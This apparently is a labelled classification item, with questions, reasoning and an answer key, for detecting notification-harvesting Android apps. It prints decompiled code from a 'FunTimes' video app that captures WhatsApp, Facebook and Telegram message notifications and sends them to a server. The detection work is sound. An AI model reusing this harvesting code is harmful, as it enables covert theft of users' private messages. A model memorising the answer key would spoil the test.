@@ -1,0 +1,129 @@
+**Input**:
+</tag>1.Store description information for the app: (Focus on descriptionHtml, which is the behavioral and functional description of the app)<tag>
+{
+    "PackageName": "fun.ae.funtimes",
+    "descriptionHtml": "Discover endless entertainment with FunTimes! Watch, share, and enjoy a vast library of videos anytime, anywhere. Dive into a world of fun today!",
+}
+
+</tag>
+Static Analysis Output.
+Taint Propagation Chain tracks the flow of notification data from when it is retrieved to where it might be used, indicating potential points of data leakage or misuse.
+Tip: The notification content in StatusBarNotification refers to the fields obtained using android.service.notification.StatusBarNotification() and android.app.Notification(), particularly focusing on whether the "android.text" field is extracted from the extras.
+<tag>
+[
+    {
+        "NLS Operation": "Notification Leakage: Local Storage",
+        "Taint Propagation Chain": "<fun.ae.funtime.services.ServiceData: void onNotificationPosted(android.service.notification.StatusBarNotification)> -> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])> -> <fun.ae.funtime.services.ServerData: java.lang.Object doInBackground(java.lang.Object[])> -> <fun.ae.funtime.services.ServerData: java.lang.String doInBackground(java.lang.String[])> -> <fun.ae.funtime.services.ServerData: java.lang.String sendListener(java.lang.String,java.lang.String,java.lang.String)> -> <fun.ae.funtime.services.ServerData: java.lang.String dataParse(java.io.InputStream)> -> <java.io.ByteArrayOutputStream: void write(int)>",
+        "Possible Sources of Taint Propagation": [
+            "",
+            "<android.service.notification.StatusBarNotification: java.lang.String getPackageName()>",
+            "<android.service.notification.StatusBarNotification: android.app.Notification getNotification()>",
+            "<android.app.Notification: java.lang.CharSequence tickerText>",
+            "<android.app.Notification: android.os.Bundle extras>"
+        ]
+    },
+    {
+        "NLS Operation": "Notification Leakage: NetWork Transmission",
+        "Taint Propagation Chain": "<fun.ae.funtime.services.ServiceData: void onNotificationPosted(android.service.notification.StatusBarNotification)> -> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])> -> <fun.ae.funtime.services.ServerData: java.lang.Object doInBackground(java.lang.Object[])> -> <fun.ae.funtime.services.ServerData: java.lang.String doInBackground(java.lang.String[])> -> <fun.ae.funtime.services.ServerData: java.lang.String sendListener(java.lang.String,java.lang.String,java.lang.String)> -> <java.net.URLConnection: java.io.OutputStream getOutputStream()>",
+        "Possible Sources of Taint Propagation": [
+            "",
+            "<android.service.notification.StatusBarNotification: java.lang.String getPackageName()>",
+            "<android.service.notification.StatusBarNotification: android.app.Notification getNotification()>",
+            "<android.app.Notification: java.lang.CharSequence tickerText>",
+            "<android.app.Notification: android.os.Bundle extras>"
+        ]
+    },
+]
+"String Comparison Operations Involved in Taint Propagation":(indicates possible comparison with these fields during notification filtering)
+{
+method<java.lang.String: boolean equals(java.lang.Object)> comparison object: "com.facebook.katana"
+method<java.lang.String: boolean equals(java.lang.Object)> comparison object: "com.whatsapp"
+method<java.lang.String: boolean equals(java.lang.Object)> comparison object: "org.telegram.messenger"
+method<android.os.Bundle: java.lang.String getString(java.lang.String)> comparison object: "android.title"
+}
+
+</tag>
+3.Source Code
+<tag>
+{
+  fun.ae.funtime.services.ServiceData  public void onNotificationPosted(StatusBarNotification paramStatusBarNotification) {
+    super.onNotificationPosted(paramStatusBarNotification);
+    try {
+      JSONObject jSONObject1 = new JSONObject();
+      this();
+      JSONArray jSONArray = new JSONArray();
+      this();
+      JSONObject jSONObject2 = new JSONObject();
+      this();
+      this.pkgname = paramStatusBarNotification.getPackageName();
+      if (this.pkgname.equals("com.whatsapp") || this.pkgname.equals("com.facebook.katana") || this.pkgname.equals("org.telegram.messenger")) {
+        if ((paramStatusBarNotification.getNotification()).tickerText != null)
+          this.ticktext = (paramStatusBarNotification.getNotification()).tickerText.toString(); 
+        SimpleDateFormat simpleDateFormat = new SimpleDateFormat();
+        this("MM_dd_yyyy__HH_mm_ss");
+        Date date = new Date();
+        this();
+        String str = simpleDateFormat.format(date);
+        Bundle bundle = (paramStatusBarNotification.getNotification()).extras;
+        this.titletext = bundle.getString("android.title");
+        this.messetext = bundle.getCharSequence("android.text").toString();
+        this.iconid = bundle.getInt("android.icon");
+        StringBuilder stringBuilder = new StringBuilder();
+        this();
+        jSONObject2.put("FROM", stringBuilder.append(this.ticktext).append("\n").toString());
+        stringBuilder = new StringBuilder();
+        this();
+        jSONObject2.put("TITLE", stringBuilder.append(this.titletext).append("\n").toString());
+        stringBuilder = new StringBuilder();
+        this();
+        jSONObject2.put("MESSAGE", stringBuilder.append(this.messetext).append("\n").toString());
+        stringBuilder = new StringBuilder();
+        this();
+        jSONObject2.put("TIME", stringBuilder.append(str).append("\n").toString());
+        stringBuilder = new StringBuilder();
+        this();
+        jSONObject2.put("APP", stringBuilder.append(this.pkgname).append("\n****\n").toString());
+        jSONArray.put(jSONObject2);
+        jSONObject1.put("List", jSONArray);
+      }
+      ServerData serverData = new ServerData();
+      this((Context)this);
+      serverData.execute((Object[])new String[] { jSONObject1.toString() });
+    } catch (Exception exception) {
+      exception.printStackTrace();
+    }
+  }
+
+
+}
+------------------------------------------------
+Questions:
+1.**Inadvertent Exposure:**  Does the app unintentionally expose notification content by transmitting or storing it insecurely, thereby creating potential attack vectors? Consider:
+  - Is the notification content transmitted or stored in plaintext rather than encrypted?
+  - Are insecure methods used on notification content, such as storing on the device's external storage or transmitting via insecure protocols like HTTP?
+  - Note: Inadvertent Exposure should only be considered when both conditions are met simultaneously.
+2. **Deliberate Harvesting:** Does the app misuse NLS to intentionally collect sensitive information from notifications? Evaluate:
+  - Does the app's use of NLS align with its stated or reasonably expected functionalities?
+  - Are there filtering processes that specifically target sensitive content (e.g., SMS credentials) or notifications from apps likely to contain sensitive information (e.g., messaging, banking, or email apps)?
+  - Note: The presence or absence of sensitive filtering alone is not definitive evidence of deliberate harvesting. Apps may collect all notification content without filtering for malicious purposes, while sensitive filtering could also be used for legitimate functions (e.g., social media message auto-reply apps). Prioritize assessing whether the app's overall intention in using NLS appears benign or malicious.
+3. **Unwarranted Notification Cancellation:** Does the app exhibit unjustified notification dismissal behaviors? Consider:
+  - Is there evidence of the app dismissing notifications to conceal its own malicious activities or other suspicious behavior?
+  - Does the app remove notifications from competitor apps in a way that could be considered unfair competition?
+  - Note: Unwarranted Notification Cancellation is constituted if one of the conditions met.
+4. **Notification Interaction with Unsolicited Crafted Content:** Does the app unsafely trigger notification actions (such as replying to social media messages directly via notifications) with unsolicited crafted content? Consider:
+  - When interacting with the notification, does the app inject malicious content, such as links to promote scams or malware, or other unsolicited content like advertising or promotional messages?
+
+Chain-of-thought:
+Step 1: Expected Behavior Analysis.
+From the App Description "Discover endless entertainment with FunTimes! Watch, share, and enjoy a vast library of videos anytime, anywhere. Dive into a world of fun today!," we infer that the app is designed to provide access to a wide range of video content. Its primary functionality should focus on video streaming, sharing, and viewing, without the need to interact with or intercept notifications from other applications.
+Step 2: Actual Behavior Determination.
+The Characterization Result reveals that the app intercepts notifications and stores them locally, as well as transmits them to a network. Further analysis of the taint propagation chain and source code confirms that the app specifically listens to notifications from social media applications such as Facebook and Telegram. This interception and handling of notification content goes beyond the expected functionality of a video streaming app.
+Step 3: Behavior Comparison.
+Upon comparing expected and actual behaviors, we find that the app’s primary declared functionality is to provide entertainment through video content. However, the behavior of intercepting and transmitting notifications from social media apps is not aligned with its stated purpose. This activity indicates an intentional collection of sensitive information, which constitutes Deliberate Harvesting. This behavior is an abuse, as it collects data unrelated to its declared functionality.
+
+
+Answer:
+1.no.
+2.yes.
+3.no.
+4.no.
